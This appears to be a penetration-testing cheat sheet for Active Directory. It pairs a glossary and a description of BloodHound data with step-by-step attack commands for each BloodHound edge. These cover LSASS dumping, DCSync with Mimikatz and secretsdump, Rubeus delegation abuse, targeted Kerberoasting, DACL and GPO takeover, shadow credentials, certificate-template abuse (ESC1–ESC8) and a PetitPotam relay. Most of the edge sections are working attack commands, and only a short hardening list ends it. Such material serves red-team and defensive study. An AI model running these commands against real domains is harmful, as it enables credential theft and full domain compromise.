# Vocabulary

#### ACE 
Access Control Entries define which security principals have which access rights to objects. An Access Control List (ACL) is a list of ACEs.

#### CIF 
The Common Internet File System is an original version of the SMB protocol.

#### Certificate Authortiy
The PKI server that generates and issues certificates.

#### Constrained Delegation 
An account with a set SPN (e.g. computer A with service A) can impersonate an user using service A at other services in Active Directory. Impersonation can be applied only to services (e.g. service B) defined in the msDS-AllowedToDelegateTo attribute of computer A. The impersonation is performed by using the S4U2Proxy Extension, after the user authenticates to service A.

#### DACL 
A Discretionary Access Control List lists all security principals to which an ACL is to be applied.

#### DFS 
The Distributed File System provide the ability to group shares on multiple servers and to transparently link shares into a single hierarchical namespace.

#### Domain Joined Computer 
A Windows computer for which a computer account has been created. This computer takes over the settings from the Active Directory.

#### DPAPI
The Data Protection Api is a cryptographic application programming interface used by to store credentials locally.

#### Enteprise CA
The Certificate Authortiy which offers the certificate templates.

#### fCONFIDENTIAL
If this flag is set for an LDAP attribute, only accounts with the permissions RIGHT_DS_READ_PROPERTY and RIGHT_DS_CONTROL_ACCESS can read the attribute (example: ms-Mcs-AdmPwd).

#### FQDN 
The Full Qualified Domain Name represents the full name in the domain context (e.g. dnshostname.domaincomponent.domaincompontent)

#### GMSA 
Group Managed Service Accounts are used to manage the passwords of service accounts automatically.

#### Kerberos Authentication Server 
This server authenticates users and services and issues the TGT together with the Key Distribution Center.

#### LAPS 
The Local Administrator Password Solution is a tool for storing local admin passwords in LDAP.

#### LDAP 
The Lightweight Directory Access Protocol is a network protocol for querying and modifying information from distributed directory services. The protocol listens on port 389 and 636 (LDAP over SSL).

#### LSASS
The Local Security Authority Server Service (LSASS) process verifies user loggings, handles password changes, creates access tokens and writes to security logs.

#### msDS-GroupMSAMembership
This attribute is used for access checks to determine if a requestor has permission to retrieve the password for a group Microsoft Account.

#### msDS-KeyCredentialLink
LDAP attribute that holds the public key of the TPM if the Key Trust model is implemented.

#### ms-MCS-AdmPwd
LDAP attribute that holds the password of the local administrator. Used inside the Local Administrator Password Solution (LAPS).

#### NOT_DELEGATED 
A flag which can be set in the UAC flags. If this flag is set, services are not allowed to impersonate this account.

#### ObjectGUID 
A unique number to identify a GPO. The ObjectGUID can be used to read the group policy via the domain controller (Ex: \\<domain>\sysvol\<domain>\Policies\{<ObjectGUID>}).

#### Object Security Descriptor 
This data structure describes who may access an object and how and defines how this access takes place (DACL + SACL).

#### PAC
The Privilege Attribute Certificate is a informations inside a TGT and contains among other things the SIDs of the groups that the user is a member of.

#### PKINIT
A Kerberos extension that enables the usage of certificates to request tickets.

#### Realm DB 
The central database for the Kerberos protocol.

#### Resource Based Constrained Delegation 
An account (e.g. computer B) with set SPN (e.g. service B) can impersonate an user using service B at other services (e.g. service C of computer C) in Active Directory. Impersonation can only take place if the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of service C lists computer B.

#### S4U2Proxy 
The service for User to Proxy Extension allows a service that has a service ticket from a user for its own service to request a service ticket from the domain controller on behalf of the user for other services. The S4U2Proxy extension works for resource-based constrained delegation even if the provided TGS of the user is not forwardable (design error of microsoft).

#### S4U2Self 
The service-for-User-to-Self extension allows a service to obtain a service ticket to itself on behalf of a arbitrary user. In order to work, the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION UAC flag of Service A need to be set to true. If the flag is not true the resulting TGS of user X will not be forwardable.

#### SACL 
A System Access Control List describes which accesses to objects are to be logged.

#### SAM 
The Security Account Manger is the logon name used to support clients and servers running earlier versions of windows, such as NT 4.0, 95, 98 and LAN Manager. Duplicate in database is not possible.

#### SCCM
The System Center Configuration Manager is deployment software.

#### Security Principal 
A user or computer account, group or process running in a security context.

#### SeEnableDelegationPrivilege 
The permission to set the TRUSTED_FOR_DELEGATION flag for computer accounts (normally owned by domain admins).

#### SID 
A unique security identifier. The access rights stored in ACLs are assigned to the security principals via the SID. The SID remains the same regardless of the name of the security principal.

#### SPN 
A Service Principal Name is a unique identifier for a service instance that is used for authentication within Kerberos. For example, you need an SPN for a web app if you want to log in to the web app using Kerberos. An SPN is assigned to the account that runs the given service. To make Kerberos authentication possible, a service ticket (encrypted with the service account password) must be deposited with the Key Distribution Center. SPNs have the form: <service>/<fqdn>. Examples of an SPN would be: imap/mail.domain.com or ldap/ldapHost1.domain.com.

#### TGS 
The Ticket Granting Service issues a service ticket for the requested service after a user or service presents its TGT. The TGS shares the same realm DB with the Kerberos Authentication Server.

#### TGT 
The Ticket Granting Ticket allows users and services to request tickets from the Ticket Granting Service.

#### TPM
The Trusted Platform Module is designed to provide hardware-based, security-related functions. It can be used to store cryptographic keys or in combination with certificates.

#### TRUSTED_FOR_DELEGATION 
A flag which can be set in the User Account Control Flags. This flag prevents the extension S4U2Self from being used. If this flag is set, a service can only forward the authentication of a user to the Kerberos Authentication Server. The impersonated user must have interacted with the service before impersonation.

#### TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION 
A flag that can be set in the UAC flags. If this flag is set, this service can request a service ticket for its own service using the S4U2Self extension for any account. No user interaction is required before impersonation.

#### UAC Flag 
User Account Control Flags can be used to set certain attributes for Active Directory objects. Among others there are attributes like DONT_REQ_PREAUTH, DONT_EXPIRE_PASSWORD, ACCOUNTDISABLE or TRUSTED_FOR_DELEGATION.

#### Unconstrained delegation 
An account with a set SPN (e.g. service A) can impersonate an user using the service set via the SPN at any other service in Active Directory. For this purpose, the service can use the user's ticket granting ticket, which is send together with the TGS for service A.

#### UPN 
The User Principle Name is the name of a system user in an email address format. Duplicate in database is possible.


# Bloodhound Components
Depending on the options used for Sharphound, the following information is collected directly from the Domain Controller:

    -Security Group Memberships
        Security Groups can consist of users, computers and other groups and are also transitive.
        This means that if user A is a member of group B and group B is a member of group C, then user A is also a member of group C.

    -Domain Trusts 
        Enterprises can historically contain several different domains.
        To enable employees to use resources across domains, it is possible for domains to be linked together using trust settings.
        A collection of different domains with mutual trusts is called a forest.
        Trusts can be one-way or two-way.
        One-way: Domain A trusts domain B, but domain B does not trust domain A.
        In such a case, domain B can access domain A's resources.
        Two-way means that the two domains trust each other.
        Trusts are transitive, if domain A trusts domain B and domain B trusts domain C, then domain A trusts domain C as well.
        Transitivity does not apply if there is only a one-way trust.
        In general, the trust between parent domain and child domain is defined as two-way.
        Means: domain.de normally has a two-way trust to test.domain.de.

    -Group Policy Links
        Group policies define access rights to resources.
        A collection of group policy configurations is called a group policy object.
        GPOs can be linked to domains or to organizational units.
        These links can be enforced.
        For example, if a GP is linked to an OU, OUs that inherit the properties of the source OU cannot block inheritance.
        Group policies are periodically applied to the registry.
        However, when the operating system attempts to authorize a user, only the registry will be checked.


    -Organizational Units Tree Structure
        Organizational units are collections of user, computer and group objects.
        They are also defined as "general-purpose" containers and are used to collect object classes that are intended to facilitate administrative work.
        OUs can also be nested and thus inherit their properties from one another.
        This can result in quite complex OU tree structures.
        OUs can also block inheritance.
        If a GP link to the parent OU is "enforced", a child OU cannot block this inheritance.

    -Properties of computers, groups and users
        This includes for example: Password Last Changed, Last Logon, Security Identifier (SID), UAC flags regarding Kerberos delegation, etc.

    -SQL Admin Links
        This information is read from set SPNs.
        Portscans are used to check whether the specified SPN is running a MsSql service.

    -Access rights of AD objects
        Access Control Entries (ACEs) can also be exploited for lateral movement.
        These for example can include ACEs such as AddMember or ForceChangePassword.

Bloodhound obtains the following information from all domain-joined Windows computers:
    -Members of interesting local groups
        This includes groups like Local Administrators, Remote Desktop, Distributed COM and Remote Management Groups.

    -Active sessions
        An active session occurs when a user logs in to a device.
        Sessions are removed again after a successful disconnection.



# Nodes

## User

    -AdminCount
    -ASREP Roastable
    -Cannot Be Delegated
    -Description
    -Distinguishedname
    -Enabled Status
    -FQDN
    -Last Logon
    -Object ID
    -Password Last Changed
    -Password Never Expires
    -Reachable High Value Targets
    -SAM
    -Sibling Objects in the Same OU
    -UPN

## Group

    -Description
    -Distinguishedname
    -FQDN
    -Members
    -Object ID
    -UPN

## Computer

    -DCOM Execution Policy
    -Description
    -Distinguishedname
    -Enabled Status
    -FQDN
    -LAPS
    -Last Logon 
    -Local Admin Rights
    -Object ID
    -OS
    -Password Last Changed
    -RDP Execution Policy
    -Sessions
    -SQL Execution Policy
    -TRUSTED_FOR_DELEGATION

## Domain

    -DCSync Execution Policy
    -Distinguishedname
    -Domain Functional Level
    -FQDN
    -Name
    -Object ID
    -Trusts

## GPO

    -Distinguishedname
    -FQDN
    -Name
    -Object ID
    -Trusts

## OU

    -Distinguishedname
    -FQDN
    -Inheritance Policy
    -Members
    -Object ID
    -SAM
    -UPN


# Edges

## MemberOf
This edge indicates that the source node is a member of the target node (group).

## HasSession
This edge indicates that the destination node (a user) has an active session on the source node (computer).

## AdminTo
This edge indicates that the source node (user or group) has administrative rights on the destination node (computer).
So it is possible to read the credentials of active sessions out of the LSASS process.

```
$> lsassy -d <domainName> -u <user> -p <password> <targetComputer>
```

## CanRDP
This edge indicates that the source node (user or group) can RDP to the destination node (computer).

```
$> xfreerdp /u:<attackerUser> /d:<domain> /p:<password> /v:<targetComputer>
```

The session of a user who is already logged in will be terminated.
It is therefore worth checking first whether a session already exists.

## CanPSRemote
This edge indicates that the source node (user or group) can establish a session via Remote Powershell on the target node (computer).

```
PS> $SecPassword = ConvertTo-SecureString '<attackerPassword>' -AsPlainText -Force
PS> $Cred = New-Object System.Management.Automation.PSCredential('<domain>\\<attackerUser>', $SecPassword)
PS> $session = New-PSSession -ComputerName <targetComputer> -Credential $Cred
PS> Invoke-Command -Session $session -ScriptBlock {Start-Process <command>}
PS> Disconnect-PSSession -Session $session
PS> Remove-PSSession -Session $session
```

## ExecuteDCOM
This edge indicates that the source node (user or group) is a member of the target node's (computer) local Distributed COM Users group.
This allows attackers to execute commands on the target computer.

```
$> impacket-dcomexec <domain>/<attackerUser>:<attackerPassword>@<targetComputer>
```

Or in Powershell:

```
PS> $mmc = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "<domain>"))
PS> $mmc.Document.ActiveView.ExecuteShellCommand("powershell.exe",$null,'<command>"',$null)
```

## SQLAdmin
This edge indicates that the source node (user or group) has administrative rights to the SQL service on the target node (computer).
Thus, via Metasploit, command line commands can be executed on the target host (of course, there are many other tools to exploit this edge):


```
msf> use auxiliary/admin/mssql/mssql_exec
msf> set CMD <command>
msf> set PASSWORD <attackerPassword>
msf> set RHOST <targetComputer>
msf> run
```

Or in Powershell using PowerUpSql:

```
PS> Get-SQLServerLinkCrawl -Instance <targetComputer> -Query "exec master..xp_cmdshell '<command>'"
```

## HasSIDHistory
This edge indicates that the SID of the destination node (user or computer) is included in the SID history from the source node (user or computer).
When the source node creates a Kerberos ticket, the ticket will contain the SID from the destination node.
Accordingly, the source node will have the same permission as the destination node.
To exploit this edge, a Kerberos ticket must be created.

```
PS> Rubeus.exe asktgt /user:<attackerUser> /domain:<domain> /rc4:<attackerNtlmHash> /nowrap /ppt
```

## TrustedBy
This edge informs about existing trust relationships.
The target node (domain) trusts the source node (domain).

## GetChanges & GetChangesAll
The source node can perform a DCSync attack using the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privilege.
DCSync is actually used to synchronize different domain controllers using the Directory Replication Service Remote Protocol (MS-DRSR).
With Mimikatz, this attack can be easily implemented:

```
PS> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\<attackeruser>"'
```

Or using secretsdump:

```
PS> impacket-secretsdump -just-dc <domain>/<user>:<password>@<rhost>
```

### AllowedToAct (Resource Based Constrained Delegation-Attack)
This edge indicates that the source node (Computer A) can abuse the delegation principle to impersonate any user to the target node (Computer B).
This means that Computer B trusts Computer A, so that computer A can impersonate any AD user account to computer B for any service (Service B) offered on Computer B.
So Computer A is listed in the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of Computer B.
To exploit this edge, one must perform a Resource Based Constrained Delegation attack.
However, the user to be impersonated (User X) must not be marked as "sensitive" and must not belong to the "Protected Users" group.
The user to be impersonated should also have administrative rights on the target host Computer B, so that the impersonated user X can log in remotely on Computer B.
Basically, impersonation is only possible if the service on computer A is linked via an SPN.
If computer A does not have an SPN, it is often possible to exploit the default domain MachineAccountQuota setting.
The default states that each AD user account can add up to 10 more machine accounts to the domain.
To implement this, you can use the Powermad or Impacket project (see AddAllowedToAct):

However, in order to request a service ticket for a service on Computer B, an attacker needs a service ticket from user X for a service on Computer A.
This service ticket can also be requested by Computer A without interaction of user X (using the extension S4U2Self), provided that the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION flag of Computer A is set to true.
If this flag is not set in the UAC flags of Computer A, only users who actually request a TGS for Service A can be impersonated.
The following command will request a TGT for Computer A, then request a service ticket for a service of Computer A on behalf of User X.
The last step will request a service ticket on behalf of User X for Service B:

```
PS> Rubeus.exe s4u /user:<attackerComputerA> /rc4:<attackerComputerNtlmHash> /impersonateuser:<targetUserX> /msdsspn:<spn>/<fqdnTargetComputerB> /ptt
```

The tickets are all loaded into memory (because of the /ptt option) so that Service B on behalf of User X can be accessed from the same logon session:

```
PS> dir \\<fqdnTargetComputerB>\C$
```

### AllowedToDelegate (Constrained Delegation-Attack)
This edge indicates that the source node (Computer A) can abuse the delegation principle to impersonate any user to the target node (Computer B).
This means that Computer B trusts Computer A, so Computer A can impersonate any AD user account to Computer B for the SPNs listed in the msDS-AllowedToDelegateTo attribute on Computer A (Spn B1).
However, the user to be impersonated (User X) must not be marked as sensitive and must not belong to the Protected Users group.
The user to be impersonated should also have administrative rights on the target host Computer B, so that the impersonated User X can log in remotely on Computer B.
If the same host (Computer B) offers an alternative service (e.g. Spn B2), which is executed by the same account, it is possible to use the alternative Spn B2 with a valid service ticket for Spn B1.
This is because the service part of the SPN (<spn>/<fqdn>) in a service ticket is not signed by Kerberos and thus can be manipulated.
The attack for this edge is very similar to the AllowedToAct edge, but here a constrained delegation attack takes place.
The following command lists the SPNs of Computer A set in msDS-AllowedToDelegateTo:

```
PS> Get-DomainUser <attackerComputerA> -Properties samaccountname,msds-allowedtodelegateto | Select -Expand msds-allowedtodelegateto
```

If the desired service is already stored as an SPN in the attribute msDS-AllowedToDelegateTo of Computer A, impersonation can be performed directly.

```
[Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
$idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('<targetUser>')
$idToImpersonate.Impersonate()
[System.Security.Principal.WindowsIdentity]::GetCurrent() | Select name
```

Alternatively, Rubeus can be used to exploit this attack vector using the extension S4U2Self.
With the option altservice an alternative service is set in the Kerberos ticket (this service - here cifs - must of course also be offered by Computer B):

```
PS> Rubeus.exe s4u /user:<attackerComputerA> /rc4:<attackerComputerNtlmHash> /impersonateuser:<targetUser> /msdsspn:"<spn>/<fqdnTargetComputerB>" /altservice:cifs /ptt
```

## AddAllowedToAct (Resource Based Constrained Delegation-Attack)

This edge indicates that the source node has the right to manipulate the msDS-AllowedToActOnBehalfOfOtherIdentity property from the destination node.
After adding a computer account controlled by the attacker, the same attack scenario results as with AllowedToAct.
To begin with, it is worth checking the setting for MS-DS-MachineAccountQuota with Powerview:

```
PS> Get-DomainObject -Domain <domain> -Properties ms-ds-machineaccountquota | Select -First 1
```

Before that you can check if at least one of the DCs is running at least on version Windows Server 2012:

```
PS> Get-NetDomainController | Select name,osversion | Format-List
```

Then you should also check that the msDS-AllowedToActOnBehalfOfOtherIdentity attribute has no previous entries on the target computer:

```
PS> Get-NetComputer <targetComputer> | Select name,msds-allowedToActOnBehalfOfOtherIdentitiy | fl
```

Then, using the Powermad project, a new computer account is added to the Active Directory:

```
PS> New-MachineAccount -MachineAccount <newComputer -Password $(ConvertTo-SecureString '<newComputerPassword>' -AsPlainText -Force)
```

Then the Security Identifier (SID) of the new computer account is output using Powerview:

```
PS> Get-NetComputer <newComputer> -Properties objectsid | Select -Expand objectsid
```

A new ACE is then created.
This will be linked to the SID of the new computer account:

```
PS> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
PS> $SDBytes = New-Object byte[] ($SD.BinaryLength)
PS> $SD.GetBinaryForm($SDBytes, 0)
```

Using Powerview, the new entry can be set and checked in the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of the target computer:

```
Get-NetComputer <targetComputer> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

The value of the attribute can be checked afterwards.

```
Get-NetComputer <targetComputer> -Properties 'msds-allowedtoactonbehalfofotheridentity'
```

Now we can perform a Resource Based Constrained Delegation attack (see AllowedToAct)


## AddKeyCredentialLink

Add Key Credentials to the attribute msDS-KeyCredentialLink of the target user/computer object and then perform a Kerberos Authentication as that account using PKINIT to retrieve the NT hash.

```
$> certipy shadow auto '<domain>/<user>:<password>'@<certificateAuthorityRhost> -account '<targetComputerOrUser>'
or
PS> Whisker.exe add /target:<targetAccount>
```


## ForceChangePassword
This edge indicates that the source node (user or group) can replace the password of the destination node (user, group, computer).
This can be done with native cmd commands:

```
PS> net user <targetUser> <newPassword> /<domain>
```

Alternatively, you can also use Powerview.

```
PS> $SecPassword = ConvertTo-SecureString '<attackerPassword>' -AsPlainText -Force
PS> $Cred = New-Object System.Management.Automation.PSCredential('<domain>\\<attackerUser>', $SecPassword)
PS> $UserPassword = ConvertTo-SecureString '<newPassword>' -AsPlainText -Force
PS> Set-DomainUserPassword -Identity <targetUser> -AccountPassword $UserPassword -Credential $Cred
```

An event with the ID 4724 can be logged.

## AddMember
This edge indicates that the source node (user or group) can add a new account to the target node (group).
Again, a simple command is sufficient natively:

```
PS> net group "<targetGroup>" <targetUserName> /add /domain
```

If you prefer to use Powerview:

```
PS> $SecPassword = ConvertTo-SecureString '<attackerPassword>' -AsPlainText -Force
PS> $Cred = New-Object System.Management.Automation.PSCredential('<domain>\\<attackerUser>', $SecPassword)
PS> Add-DomainGroupMember -Identity '<targetGroup>' -Members '<targetUser>' -Credential $Cred
PS> Get-DomainGroupMember -Identity '<targetGroup>'
```

Cleanup using:

```
PS> Remove-DomainGroupMember -Identity <targetGroup> -Members <targetUser> -Verbose
```

## AddSelf
This edge indicates the principal has the ability to add itself to the target security group.
See AddMember

## ReadLAPSPassword
This edge indicates that the source node (user or group) can read the password for the local administrator account (LAPS) on the target computer via LDAP.
The readout can be done using Powerview:

```
PS> $SecPassword = ConvertTo-SecureString '<attackerPassword>' -AsPlainText -Force
PS> Cred = New-Object System.Management.Automation.PSCredential('<domain>\\<attackerUser>', $SecPassword)
PS> Get-DomainObject <targetComputer> -Credential $Cred -Properties "ms-mcs-AdmPwd",name
```

## ReadGMSAPassword
This edge indicates that the source node (user or group) can read the password from GMSA service for the destination node (computer).
To be able to read the password, the GMSAPasswordReader tool can be used:

```
PS> ./GMSAPasswordReader --AccountName <targetComputer>
```

## AllExtendedRights
AllExtendedRights denotes special rights which guarantee write rights to the target object.
The procedure differs depending on the type of the target node:

### User
ForceChangePassword

### Group
AddMember

### Computer
AddAllowedToAct

## GenericWrite
With GenericWrite it is possible to overwrite attributes of the target object.
The procedure differs depending on the type of the target node:

### User
As an attacker, GenericWrite can be used to set a new SPN on the target account.
By setting an SPN, a kerberoast attack is possible.
In this case, such an action is called Targeted Kerberoasting.
This attack can be implemented with the help of Powerview.
Check already existing SPN value:

```
PS> Get-DomainObject -Identity machineAccount05 -Properties serviceprincipalname
```

Then set a new SPN value:

```
PS> Set-DomainObject -Identity <targetAccount> -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
```

A service ticket is then requested for the SPN that has just been set:

```
PS> Get-DomainSPNTicket <targetAccount> | fl
```

The password hash from the target account can then be cracked offline using the service ticket.
Finally, the SPN must be removed again (if there where no previous SPN):

```
PS> Set-DomainObject -Identity <targetAccount> -Clear serviceprincipalname
```

### Group
AddMember

### Computer
AddAllowedToAct

## GenericAll
This edge indicates that the source node has full permission on the destination node.
The usage of this edge differs depending on the type of the destination node.

### User
ForceChangePassword or Targeted Kerberoast (see GenericWrite/Node=User)

### Group
AddMember

### Computer
AddAllowedToAct or ReadLAPSPassword 

### Domain Object
GetChanges & GetChangesAll

### GPO
Computer Group Policies are regularly updated in an interval of about 1 to 2 hours.
For example, you could add a new Scheduled Task to the GPO.
This task could execute command line commands as soon as the group policies are reloaded.
To add a new local administrator using GPO run:

```
PS> Add-LocalAdmin -GPOIdentity '<gpo>' -Member <newAdministrator> -Domain <domain>
```

### OU
With the GenericAll right it is possible to add a new ACE to the OU.
These are then applied to the objects contained in the OU.

## WriteDacl

WriteDacl allows to add new entries to the DACL of a target object.
The procedure differs depending on the type of the target node.
New entries to DACLs can be added with Powerview.

### User
An attacker can grant himself all access permissions:

```
PS> Add-DomainObjectAcl -PrincipalIdentity <targetUser> -Rights All
```

For example, you can also use only the right to reset the password:

```
PS> Add-DomainObjectAcl -PrincipalIdentity <targetUser> -PrincipalIdentity <attackerAccount> -Rights ResetPassword
```

After that, an attack can be made via ForceChangePassword or Targeted Kerberoast (see GenericWrite/Node=User).

### Group
An attacker can grant himself the right to add new users to the target group.

```
PS> Add-DomainObjectAcl -PrincipalIdentity "<targetGroup>" -Rights WriteMembers
```

After that, the rest of the procedure can be done as for AddMember.

### Computer
An attacker can grant himself all access permissions:

```
PS> Add-DomainObjectAcl -PrincipalIdentity <targetComputerAccount> -Rights All
```

The further procedure is then the same as for AddAllowedToAct or ReadLAPSPassword.

### GPO
An attacker can give himself full control over a GPO:

```
PS> Add-DomainObjectAcl -PrincipalIdentity <targetGpo> -Rights All
```

### OU
Again, an attacker can gain full control of the OU:

```
PS> Add-DomainObjectAcl -PrincipalIdentity (<ouGuid>) -Rights All
```

The further course results depending on which object is contained in the OU - see GenericAll.


### Domain
An attacker can grant himself the right for DCSync:

```
PS> Add-DomainObjectAcl -PrincipalIdentity <domain> -Rights DCSync
```

After that, the further steps are the same as for GetChanges & GetChangesAll.

## Owns
As the owner of an object, you can also add new entries to the object's DACL (see WriteDacl).

## WriteOwner
WriteOwner allows an attacker to overwrite the owner of an object.
This can be done with the help of Powerview:

```
PS> $SecPassword = ConvertTo-SecureString '<attackerPassword>' -AsPlainText -Force
PS> $Cred = New-Object System.Management.Automation.PSCredential('<domain>\\<attackerUser>', $SecPassword)
PS> Set-DomainObjectOwner -Credential $Cred -PrincipalIdentity "<targetObject>" -OwnerIdentity <attackerUser>
```

## WriteSPN
The ability to write directly to the servicePrincipalNames attribute on a user object.
This can be done with the help of Powerview:

```
PS> $SecPassword = ConvertTo-SecureString '<attackerPassword>' -AsPlainText -Force
PS> $Cred = New-Object System.Management.Automation.PSCredential('<domain>\\<attackerUser>', $SecPassword)
PS> Set-DomainObject -Credential $Cred -Identity <targetAccount> -SET @{serviceprincipalname='<service>/<hostname>'}
PS> Get-DomainSPNTicket -Credential $Cred <targetAccount> | fl
        PS> Set-DomainObject -Credential $Cred -Identity <targetAccount> -Clear serviceprincipalname
```


## GpLink
The edge indicates that the source node (GPO) is linked to the target node (OU or domain).
A dashed edge means that the GPO is not enforced.

## Contains
This edge indicates that the target node (user, group or computer) is contained in the source node (Organizational Unit).
If the edge is dashed, the OU blocks inheritance for GPOs that are not enforced.
If a GPO is linked to an OU, this GPO applies to all objects contained in the OU.
If you have control over an OU, you can add new ACEs to the OU.
To exploit this edge, Powerview can be used to add, for example, the GenericAll permission to the OU.
The ObjectGUID of the OU can be taken directly from Bloodhound.
First all GUIDs are stored in a variable:

```
PS> $Guids = Get-DomainGUIDMap
PS> $AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name
```

Then a new ACE is created, which gives the attacker account full control over the OU:

```
PS> $ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity '<attackerUser>' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid
```

The new ACE is then applied to the OU:

```
PS> $OU = Get-DomainOU -Raw ("<ouGuid>")
PS> $DsEntry = $OU.GetDirectoryEntry()
PS> $dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
PS> $dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
PS> $dsEntry.PsBase.CommitChanges()
```

The further course results depending on which object is contained in the OU - see GenericAll.

## Enroll (Certipy)

### ESC1

ESC1 allows Client Authentication and permits the enrollee to supply an arbitrary Subject Alternative Name (SAN) to a certficate.

```
$> certipy req '<domain>/<user>:<password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -template 'ESC1' -alt '<targetUser>@<domain>'
```

Using the certificate the NT hash can be extracted:

```
$> certipy auth -pfx '<file>.pfx' -username '<user>' -domain '<domain>' -dc-ip <domainController>
```

### ESC2

ESC2 is when a certificate template can be used for any purpose (see ESC3 - use template = ESC2).

### ESC3

ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent).
This EKU can be used to request certificates on behalf of other users. 

Request Certificate Request Agent certificate:

```
$> certipy req '<domain>/<user>:<password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -template '<ESC3>'
```

Use this certificate with -on-behalf-of parameter (must be in the form of domain\user, and not the FQDN of the domain)

```
$> certipy req '<domain>/<user>:<password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -template 'User' -on-behalf-of '<domain>\<user>' -pfx '<file>.pfx'
```

### ESC4

ESC4 is when a user has write privileges over a certificate template.
Overwrite the template and make it vulnerable to ESC1:

```
$> certipy template '<domain>/<user>'@<certificateRhost> -hashes :<ntHash> -template 'ESC4' -save-old
```

Request a certificate:

```
$> certipy req '<domain>/<user>':'<password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -template 'ESC4' -alt '<targetUser>@<domain>'
```

Restore the configuration afterwards:


```
$> certipy template '<domain>/<user>'@<certificatesRhost> -hashes :<ntHash> -template 'ESC4' -configuration '<file>.json'
```

### ESC6

ESC6 is when the CA specifies the EDITF_ATTRIBUTESUBJECTALTNAME2 flag.
In essence, this flag allows the enrollee to specify an arbitrary SAN on all certificates despite a certificate template’s configuration (see ESC1).

### ESC7 (Manage CA & Manage Certificates)

In order for this technique to work, the user must also have the Manage Certificates access right, and the certificate template SubCA must be enabled.
Add Manage Certificates access right:

```
$> certipy ca '<domain>/<user>:<password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -add-officer '<attackerUser>'
```

Enable SubCA:

```
$> certipy ca '<domain>/<user>:<password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -list-templates 

$> certipy ca '<domain>/<user>:<password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -enbale-template '<template>'
```

Request a certificate based on the SubCA certificate template and receive CERTSRV_E_TEMPLATE_DENIED error:

```
$> certipy req '<domain>/<user><password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -template 'ESC4' -alt '<targetUser>@<domain>'
```

Issue a failed certificate request specifying the request ID:

```
$> certipy ca '<domain>/<user>:<password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -issue-request <id>
```

Retreive certificate:

```
$> certipy req '<domain>/<user><password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -retrieve <id>
```

Extract NT hash:

```
$> certipy auth -pfx '<file>.pfx' -username '<user>' -domain '<domain>' -dc-ip <domainController>
```

### ESC8

An Enrollment Service has installed and enabled HTTP Web Enrollment.
Start relay server:

```
$> certipy relay -ca <certificateAuthorityIp> -template '<DomainController>'
```

Trigger authentication using petitpotam:

```
petitpotam.py '<domain>/<user>:<password>@<fqdnRhost>' <attackerIp>
```

Get NT hash of domain controller:

```
$> certipy auth -pfx '<file>.pfx' -username '<user>' -domain '<domain>' -dc-ip <domainController>
```


# Best Practice
- Check and follow up log notifications
- Disable Link-Local Multicast Name Resolution and Multicast Name Resolution protocol
- Disable LM hashes
- Enable Bitlocker
- Enable SMB-signing
- Enforce long passwords using the password policy
- Lock access to Powershell or use Constrained Language mode
- Lock screen if IDL
- Only allow signed Macros
- Perfom vulnerability scans on regularly base
- Refrain from password reuse for different accounts
- Refuse RDP connections if certificate mismatch
- Restrict Delegation of credential to remote servers
- Show file extensions by default
- Use AppLocker and application whitelisting
- Use honeypots and honeytokens
- Use Local Administrator Password Solution
- Use separate accounts for administration of different areas

